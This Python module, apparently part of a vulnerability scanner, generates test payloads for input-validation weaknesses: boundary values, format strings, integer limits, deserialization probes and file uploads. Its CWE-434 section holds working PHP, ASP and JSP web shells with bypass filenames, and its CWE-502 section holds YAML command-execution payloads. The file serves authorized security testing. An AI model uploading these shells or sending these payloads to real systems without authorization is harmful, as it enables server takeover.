# =============================================================================
# payloads/cwe/payload_generator.py
# CWE v4.20 — W-1-6 "입력값 크기 및 무결성 검증오류" 전용 페이로드
#
# 포함 항목 (6개 범주):
#   CWE-20  : Improper Input Validation
#   CWE-119 : Improper Restriction within Buffer (+ 120/121/122/126/131 하위)
#   CWE-134 : Use of Externally-Controlled Format String
#   CWE-190 : Integer Overflow  /  CWE-191 : Integer Underflow
#   CWE-502 : Deserialization of Untrusted Data
#   CWE-434 : Unrestricted Upload of File with Dangerous Type
#
# 제외 (다른 팀원 모듈): SQLi, XSS, LDAP, CMDi, 경로탐색, CSRF, 세션, 인증 등
#
# 주의: 반드시 허가된 테스트 환경에서만 실행하세요.
# =============================================================================

import base64
import logging

logger = logging.getLogger(__name__)
SOURCE_TAG = "cwe"


class CWEPayloadGenerator:
    """
    W-1-6 전용 CWE 페이로드 생성기.
    페이로드 딕셔너리:
        source       : "cwe"
        cwe_id       : "CWE-XX"
        cwe_name     : CWE 이름
        attack_vector: body | query | header
        name         : 고유 이름
        value/body   : 페이로드
    """

    # =========================================================================
    # CWE-20  Improper Input Validation
    # =========================================================================
    @staticmethod
    def cwe20_payloads() -> list:
        """CWE-20: 입력값 유효성 검증 부재 — 타입 혼동 및 비정상 값."""
        payloads = []
        cases = [
            (None,          "null_value"),
            (True,          "bool_true"),
            (False,         "bool_false"),
            ([],            "empty_array"),
            ({},            "empty_object"),
            ("",            "empty_string"),
            (0,             "zero_int"),
            (-1,            "negative_int"),
            (1.7e308,       "max_float"),
            ("NaN",         "nan_string"),
            ("Infinity",    "infinity_string"),
            ("\x00" * 100,  "null_bytes_100"),
            ("\xff" * 100,  "high_bytes_100"),
            ("A" * 8192,    "boundary_8KB"),
            ("A" * 16384,   "boundary_16KB"),
            ("A" * 32768,   "boundary_32KB"),
            ("A" * 65536,   "boundary_64KB"),
        ]
        for val, name in cases:
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-20",
                "cwe_name": "Improper Input Validation",
                "attack_vector": "body",
                "name": f"cwe20_{name}", "body": {"input": val}
            })
        logger.debug(f"[CWE] CWE-20: {len(payloads)}개")
        return payloads

    # =========================================================================
    # CWE-119/120/121/122/126/131  버퍼 오버플로우 계열
    # =========================================================================
    @staticmethod
    def cwe_buffer_payloads() -> list:
        """CWE-119~131 버퍼 오버플로우 계열."""
        payloads = []

        # CWE-120: 크기 미검증 복사 — 경계값 크기 시리즈
        for size, label in [
            (256,    "256B"), (512,    "512B"),  (1024,   "1KB"),
            (4096,   "4KB"),  (8192,   "8KB"),   (16384,  "16KB"),
            (32768,  "32KB"), (65536,  "64KB"),
        ]:
            for vector in ["query", "body", "header"]:
                payloads.append({
                    "source": SOURCE_TAG, "cwe_id": "CWE-120",
                    "cwe_name": "Buffer Copy without Checking Size of Input",
                    "attack_vector": vector,
                    "name": f"cwe120_{label}_{vector}",
                    "value": "A" * size
                })

        # CWE-121: 스택 오버플로우 — 패턴 문자열
        for val, name in [
            ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9" * 34, "cyclic_1KB"),
            ("BBBB" * 256,                            "bbbb_1KB"),
            ("\x41" * 2048,                           "hex41_2KB"),
        ]:
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-121",
                "cwe_name": "Stack-based Buffer Overflow",
                "attack_vector": "body",
                "name": f"cwe121_{name}", "body": {"data": val}
            })

        # CWE-122: 힙 오버플로우 — 1MB/5MB는 로컬 서버 다운 유발로 제외
        # for size, label in [(1_000_000, "1MB"), (5_000_000, "5MB")]:
        #     payloads.append({
        #         "source": SOURCE_TAG, "cwe_id": "CWE-122",
        #         "cwe_name": "Heap-based Buffer Overflow",
        #         "attack_vector": "body",
        #         "name": f"cwe122_heap_{label}",
        #         "body": {"data": "H" * size}
        #     })

        # CWE-126: 경계 초과 읽기
        payloads.append({
            "source": SOURCE_TAG, "cwe_id": "CWE-126",
            "cwe_name": "Buffer Over-read",
            "attack_vector": "query",
            "name": "cwe126_overread_null_term",
            "value": "A" * 65535 + "\x00"
        })

        # CWE-131: 버퍼 크기 계산 오류 (멀티바이트 문자)
        for val, name in [
            ("가" * 5000, "korean_5K_utf8_3B"),   # UTF-8: 3바이트/문자
            ("😀" * 2500, "emoji_2500_utf8_4B"),   # UTF-8: 4바이트/문자
            ("中" * 5000, "cjk_5K_utf8_3B"),
        ]:
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-131",
                "cwe_name": "Incorrect Calculation of Buffer Size",
                "attack_vector": "body",
                "name": f"cwe131_{name}", "body": {"data": val}
            })

        logger.debug(f"[CWE] Buffer 계열: {len(payloads)}개")
        return payloads

    # =========================================================================
    # CWE-134  Format String
    # =========================================================================
    @staticmethod
    def cwe134_payloads() -> list:
        """CWE-134: 외부 제어 포맷 스트링."""
        payloads = []
        fmt_cases = [
            ("%s" * 50,              "s_50"),
            ("%n" * 30,              "n_30"),
            ("%x" * 50,              "x_50"),
            ("%p" * 50,              "p_50"),
            ("%d" * 50,              "d_50"),
            ("%.256s" * 20,          "precision_s_20"),
            ("%999999d",             "large_width_d"),
            ("AAAA%x.%x.%x.%x.%n",  "classic_exploit"),
            ("%1$s%2$s%3$s%4$s%5$s", "positional_args"),
            ("%08x" * 30,            "hex_dump_30"),
            ("%*d" * 20,             "width_arg_20"),
            ("%" + "A" * 1000,       "long_fmt_1K"),
        ]
        for val, name in fmt_cases:
            for vector in ["query", "body", "header"]:
                payloads.append({
                    "source": SOURCE_TAG, "cwe_id": "CWE-134",
                    "cwe_name": "Use of Externally-Controlled Format String",
                    "attack_vector": vector,
                    "name": f"cwe134_{name}_{vector}", "value": val
                })
        logger.debug(f"[CWE] CWE-134: {len(payloads)}개")
        return payloads

    # =========================================================================
    # CWE-190/191  Integer Overflow / Underflow
    # =========================================================================
    @staticmethod
    def cwe_integer_payloads() -> list:
        """CWE-190/191: 정수 오버플로우/언더플로우."""
        payloads = []
        int_cases = [
            # CWE-190 (양의 방향 경계)
            (2**7 - 1,        "int8_max",    "CWE-190"),
            (2**7,            "int8_max+1",  "CWE-190"),
            (2**15 - 1,       "int16_max",   "CWE-190"),
            (2**15,           "int16_max+1", "CWE-190"),
            (2**31 - 1,       "int32_max",   "CWE-190"),
            (2**31,           "int32_max+1", "CWE-190"),
            (2**32 - 1,       "uint32_max",  "CWE-190"),
            (2**32,           "uint32_max+1","CWE-190"),
            (2**63 - 1,       "int64_max",   "CWE-190"),
            (2**64 - 1,       "uint64_max",  "CWE-190"),
            (0,               "zero",        "CWE-190"),
            # CWE-191 (음의 방향 경계)
            (-1,              "minus_one",   "CWE-191"),
            (-2**7,           "int8_min",    "CWE-191"),
            (-2**15,          "int16_min",   "CWE-191"),
            (-2**31,          "int32_min",   "CWE-191"),
            (-2**31 - 1,      "int32_min-1", "CWE-191"),
            (-2**63,          "int64_min",   "CWE-191"),
            # 문자열로도 전송 (파싱 오류 유발)
            (str(2**63 - 1),  "int64_max_str","CWE-190"),
            (str(-2**63),     "int64_min_str","CWE-191"),
        ]
        for val, name, cwe_id in int_cases:
            cwe_name = "Integer Overflow" if cwe_id == "CWE-190" else "Integer Underflow"
            for vector in ["body", "query"]:
                payloads.append({
                    "source": SOURCE_TAG, "cwe_id": cwe_id,
                    "cwe_name": cwe_name, "attack_vector": vector,
                    "name": f"cwe_int_{name}_{vector}",
                    "value": str(val) if vector == "query" else val
                })
        logger.debug(f"[CWE] Integer 계열: {len(payloads)}개")
        return payloads

    # =========================================================================
    # CWE-502  Deserialization of Untrusted Data
    # =========================================================================
    @staticmethod
    def cwe502_payloads() -> list:
        """CWE-502: 역직렬화 — 무결성 검증 부재."""
        payloads = []

        # Java 직렬화 오브젝트 (0xACED0005 마커)
        java_objects = [
            (b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer"
             b"\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I"
             b"\x00\x05valuexr\x00\x10java.lang.Number"
             b"\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01",
             "java_integer"),
            (b"\xac\xed\x00\x05sr\x00\x11java.util.ArrayList"
             b"\x78\x01\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01I"
             b"\x00\x04sizexp\x00\x00\x00\x00w\x04\x00\x00\x00\x00x",
             "java_arraylist"),
            (b"\xac\xed\x00\x05t\x00\x06foobar", "java_string"),
        ]
        for raw, name in java_objects:
            b64 = base64.b64encode(raw).decode()
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-502",
                "cwe_name": "Deserialization of Untrusted Data",
                "attack_vector": "body",
                "name": f"cwe502_{name}_b64",
                "body": {"data": b64, "_type": "java.io.Serializable"}
            })
            # 헤더로도 전송 (Content-Type 변조)
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-502",
                "cwe_name": "Deserialization of Untrusted Data",
                "attack_vector": "header",
                "name": f"cwe502_{name}_header",
                "headers": {
                    "X-Java-Serialized-Object": b64,
                    "Content-Type": "application/x-java-serialized-object"
                }
            })

        # Python pickle
        pickle_objects = [
            (b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.", "pickle_v4_empty"),
            (b"\x80\x02\x5d\x71\x00.",                           "pickle_v2_list"),
            (b"\x80\x02}q\x00.",                                  "pickle_v2_dict"),
        ]
        for raw, name in pickle_objects:
            b64 = base64.b64encode(raw).decode()
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-502",
                "cwe_name": "Deserialization of Untrusted Data",
                "attack_vector": "body",
                "name": f"cwe502_{name}",
                "body": {"data": b64, "format": "pickle"}
            })

        # PHP unserialize
        php_strings = [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;s:4:"test";}',
            'O:8:"stdClass":1:{s:4:"test";i:1;}',
        ]
        for php_str in php_strings:
            safe_name = php_str[:15].replace('"','').replace(':','_').replace(';','')
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-502",
                "cwe_name": "Deserialization of Untrusted Data",
                "attack_vector": "body",
                "name": f"cwe502_php_{safe_name}",
                "body": {"data": php_str, "format": "php_serialize"}
            })

        # YAML 역직렬화 (SnakeYAML 등)
        yaml_payloads = [
            "!!java.lang.ProcessBuilder [id]",
            "!!python/object/apply:os.system ['id']",
            "!!python/object/apply:subprocess.check_output [['id']]",
        ]
        for yml in yaml_payloads:
            safe_name = yml[:20].replace(' ','_').replace('!','').replace('/','_')
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-502",
                "cwe_name": "Deserialization of Untrusted Data",
                "attack_vector": "body",
                "name": f"cwe502_yaml_{safe_name}",
                "body": {"data": yml, "format": "yaml"}
            })

        logger.debug(f"[CWE] CWE-502: {len(payloads)}개")
        return payloads

    # =========================================================================
    # CWE-434  Unrestricted File Upload (크기/무결성 검증 관점)
    # =========================================================================
    @staticmethod
    def cwe434_payloads() -> list:
        """CWE-434: 위험 파일 타입 업로드 — 무결성 검증 부재."""
        payloads = []
        boundary = "----ARGUSCWEBoundary2025"

        def make_multipart(filename, ctype, content):
            return (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f"Content-Type: {ctype}\r\n\r\n{content}\r\n"
                f"--{boundary}--\r\n"
            ), f"multipart/form-data; boundary={boundary}"

        # 확장자-MIME 혼동 (무결성 검증 우회)
        upload_cases = [
            # (filename, Content-Type, content, test_name)
            ("shell.php",    "application/x-php",   "<?php system($_GET['c']); ?>",      "php_direct"),
            ("shell.php5",   "application/x-php",   "<?php echo shell_exec('id'); ?>",   "php5"),
            ("shell.phtml",  "application/x-php",   "<?php passthru('id'); ?>",           "phtml"),
            ("shell.php",    "image/jpeg",           "<?php system($_GET['c']); ?>",      "php_as_jpeg"),   # MIME 혼동
            ("shell.php",    "image/png",            "<?php system($_GET['c']); ?>",      "php_as_png"),
            ("img.jpg.php",  "application/x-php",   "<?php system('id'); ?>",            "double_ext"),
            ("shell.asp",    "application/octet-stream",
             '<%=CreateObject("Wscript.Shell").Exec(Request("c")).StdOut.ReadAll()%>',   "asp"),
            ("shell.jsp",    "application/octet-stream",
             '<% Runtime.getRuntime().exec(request.getParameter("c")); %>',              "jsp"),
            # 제외: 초대형 파일 (10MB/50MB) — 로컬 서버 다운 유발
            # ("huge.bin",     "application/octet-stream", "X" * 10_000_000,              "10MB_size"),
            # ("huge2.bin",    "application/octet-stream", "X" * 50_000_000,              "50MB_size"),
            # null byte 우회
            ("shell.php\x00.jpg", "image/jpeg",    "<?php system('id'); ?>",            "null_byte_bypass"),
        ]
        for filename, ctype, content, test_name in upload_cases:
            body, ct = make_multipart(filename, ctype, content)
            payloads.append({
                "source": SOURCE_TAG, "cwe_id": "CWE-434",
                "cwe_name": "Unrestricted Upload of File with Dangerous Type",
                "attack_vector": "body",
                "name": f"cwe434_{test_name}",
                "body": body, "boundary": boundary,
                "content_type": ct
            })

        logger.debug(f"[CWE] CWE-434: {len(payloads)}개")
        return payloads

    # =========================================================================
    # 전체 반환
    # =========================================================================
    def get_all_payloads(self) -> list:
        """W-1-6 전용 CWE 전체 페이로드 반환."""
        all_payloads = (
            self.cwe20_payloads()
            + self.cwe_buffer_payloads()
            + self.cwe134_payloads()
            + self.cwe_integer_payloads()
            + self.cwe502_payloads()
            + self.cwe434_payloads()
        )
        logger.info(f"[CWE W-1-6] 전체 페이로드: {len(all_payloads)}개")
        return all_payloads
